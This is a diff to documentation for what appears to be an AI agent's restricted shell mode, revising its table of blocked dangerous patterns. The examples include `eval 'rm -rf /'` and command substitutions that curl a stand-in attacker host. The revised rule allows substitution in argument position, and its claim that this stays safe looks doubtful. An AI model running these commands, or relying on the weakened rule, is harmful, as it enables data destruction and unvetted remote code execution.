@@ -254,19 +254,23 @@ shell_allowlist = ["git", "cargo", "npm", "node", "python", "make"]`}</code></pr
     <li>Quoted arguments containing operators (<code>grep 'a && b'</code> — not split)</li>
   </ul>
 
-  <h3>Dangerous Pattern Blocking</h3>
+  <h3>Dangerous Pattern Blocking <span class="text-xs font-normal text-muted ml-2">updated v3.6.18</span></h3>
   <p>Regardless of allowlist contents, the following patterns are unconditionally blocked in restricted mode:</p>
 
   <table>
-    <thead><tr><th>Pattern</th><th>Risk</th><th>Example</th></tr></thead>
+    <thead><tr><th>Pattern</th><th>Risk</th><th>Blocked</th><th>Allowed</th></tr></thead>
     <tbody>
-      <tr><td><code>eval</code></td><td>Arbitrary code execution</td><td><code>eval 'rm -rf /'</code></td></tr>
-      <tr><td>Backticks <code>`…`</code></td><td>Command substitution bypass</td><td><code>echo `whoami`</code></td></tr>
-      <tr><td><code>$(…)</code></td><td>Command substitution in any position</td><td><code>git status && $(curl evil.com)</code></td></tr>
+      <tr><td><code>eval</code></td><td>Arbitrary code execution</td><td><code>eval 'rm -rf /'</code></td><td>—</td></tr>
+      <tr><td>Backticks <code>`…`</code> at command position</td><td>Command substitution bypass</td><td><code>`curl evil.com`</code></td><td><code>echo `date`</code> (argument position)</td></tr>
+      <tr><td><code>$(…)</code> at command position</td><td>Command substitution bypass</td><td><code>$(curl evil.com)</code></td><td><code>git commit -m "$(cat msg)"</code> (argument position)</td></tr>
     </tbody>
   </table>
 
-  <p>These patterns are blocked even if the surrounding command is in the allowlist, because the inner commands bypass allowlist validation entirely.</p>
+  <p>
+    Backticks and <code>$(…)</code> are only blocked when they appear as the <strong>first token</strong> of a command segment
+    (command position). In argument position, the base command is still validated against the allowlist.
+    <code>eval</code> is always blocked regardless of position.
+  </p>
 
   <h2 id="proxy-hardening">HTTP Proxy Hardening <span class="text-xs font-normal text-muted ml-2">v3.6.8</span></h2>
   <p>The local MCP proxy server implements defense-in-depth against unauthorized access, even from other processes on the same machine:</p>
